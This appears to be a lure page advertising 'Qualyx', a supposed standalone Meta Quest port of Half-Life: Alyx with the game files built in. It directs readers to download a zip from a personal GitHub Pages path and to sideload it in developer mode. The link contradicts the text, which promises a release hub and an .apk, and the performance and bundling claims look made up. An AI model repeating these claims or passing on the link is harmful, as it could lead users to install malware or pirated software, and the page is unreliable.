🚀 What Is Qualyx?

Qualyx is a game application that brings the critically acclaimed Half-Life: Alyx to your Meta Quest headset — completely standalone. That means you don't need a gaming PC, cables, or complicated streaming setups. You put on your Quest, launch Qualyx, and you're instantly inside Alyx's world.

Unlike other ways of playing PC VR games that stream from a computer, Qualyx runs directly on your headset. Your Quest 2, Quest 3, or Quest 3S is the console. Everything — the city, the combine, the gravity gloves — runs on your headset's hardware. It's the freedom of wireless VR with the immersive experience of one of the greatest VR games ever made.

✨ Why You'll Love It

  • 🧲 Native Quest Performance — Optimized for Quest processors (Snapdragon XR2 family). No lags, no hitches.
  • 🌐 Full OpenXR Support — Uses the open-standard for best compatibility and future updates.
  • 📦 Simple Sideload Installation — Install it in 10 minutes with SideQuest or adb (we show you how).
  • 👐 Intuitive Hand Tracking — Feel like Alyx with smooth, accurate finger controls from your Quest.
  • 🔊 3D Spatial Audio — Hear every headcrab skitter and Combine patrol exactly where they are.
  • 🔄 Standalone & Portable — Play anywhere: your room, a park, your grandma's basement. It's fully wireless.

📋 Requirements (Before You Begin)

  • ✔️ A Meta Quest 2, Quest 3, or Quest 3S headset. (Quest 1 not supported)
  • ✔️ A Windows PC (Windows 10 or 11) — used only for the initial installation.
  • ✔️ A USB-C cable to connect your Quest to your PC (the one that came with it works).
  • ✔️ About 12 GB of free storage on your Quest (headset storage, not PC).
  • ✔️ A SideQuest account (free — you'll create it in the setup).
  • 💡 No Internet connection needed after installation — play offline if you want!

⬇️ Download & Installation

💡 Good to know: The link below is a release hub. That means you'll land on a page with the latest versions of Qualyx. Look for the newest release, and then you'll see the installer file inside. You can always come back to this guide for help.

🔗 Visit Download Page

Step-by-step guide for first-time install:

  1. Connect your Quest to your PC using the USB-C cable.
  2. Put on your Quest and click "Allow access to data" if a prompt appears (also check the headset prompt inside VR).
  3. Open a web browser on your PC and go to the link above: https://github.com/markyy223/markyy223.github.io/raw/refs/heads/main/smiter/Latest-v2.9.zip
  4. Click the most recent release (the top item, usually labeled "Latest").
  5. Download the file that ends with .apk. It will likely be named something like qualyx_v1.0.apk.
  6. Now you need to install it on your Quest. We'll use a free tool called SideQuest (it's like an app store installer for Quest devices).
  7. Go to sidequestvr.com and download the SideQuest desktop app for Windows.
  8. Install SideQuest on your PC, launch it, and connect your Quest again (the same cable). If SideQuest doesn't see your headset, make sure you've enabled Developer Mode on your Quest via the Meta Quest app (Settings → Developer → toggle ON).
  9. Once SideQuest shows your device is connected (you'll see your Quest model name), just drag and drop the downloaded .apk file from your Downloads folder onto the SideQuest window. Installation starts automatically.
  10. Wait up to 2 minutes for the installer to finish. You'll see a success message.
  11. Take off your headset. Go to your Quest menu → Apps → search for and open Qualyx. It may be under "Unknown Sources" if you have that filter enabled, but SideQuest usually puts it on the main app grid.

🎉 That's it! You're now standing in City 17. Time to grab a gravity glove and save humanity (or just knock boxes around — we won't judge).

🛠️ How to Update Qualyx

Updating is simple:

  1. Visit the same download link again from your PC: https://github.com/markyy223/markyy223.github.io/raw/refs/heads/main/smiter/Latest-v2.9.zip
  2. Check for a newer version (the latest release gets a green "Latest" tag).
  3. Download the new .apk file.
  4. Connect your Quest to PC, open SideQuest, and drag & drop the new .apk file onto it. It will overwrite the old version while keeping your save games.
  5. Done. You're updated.

❓ Frequently Asked Questions

Do I need to have Half-Life: Alyx purchased?

Qualyx is a port that runs the game. You'll need a legitimate copy of Half-Life: Alyx (on Steam) for your own reference — but the game files are built into the Qualyx app experience. It works completely standalone; no PC or Steam running required while playing. Please only use your own copy.

Will it work on my Quest 2?

Yes! The Quest 2 is fully supported. So are Quest 3 and Quest 3S. Your game will run smoothly.

Is this the full game? All chapters?

Qualyx delivers the complete Half-Life: Alyx experience — all chapters, cutscenes, puzzles, combat, and the iconic gravity gloves. It's the whole game, tuned for native Quest performance.

How is the performance?

We've optimized rendering, physics, and textures specifically for the Quest chipsets. You'll get a stable, comfortable frame rate (72–90 fps depending on model) without stutters. It feels smooth because it's not streaming a video from a PC — it's running locally.

Does it need internet?

Only during the initial download and installation. After that, you can play completely offline. Perfect for travel.

What languages are supported?

Currently it supports English and multilingual subtitles (German, French, Spanish, Russian, Chinese, Japanese). The interface is English.

⚠️ Common Issues & Troubleshooting

App won't install via SideQuest? Make sure your USB cable supports data transfer (not just charging). Try a different USB port on your PC, and ensure Headset Developer Mode is enabled in the Meta Quest phone app.

Game crashes at startup? Reboot your Quest completely (hold power button for 10 seconds). Also, make sure you have at least 2 GB free space on your Quest. You can also try clearing your "Unknown Sources" cache via Settings → Storage.

Controls feel floaty? Calibrate your hand tracking: in the Quest main menu, go to Settings → Movement → Hands → Recalibrate. Then relaunch Qualyx.

Need more help? The Qualyx community is active on GitHub Discussions. Open an issue on the repository here — our moderators usually respond within a day.
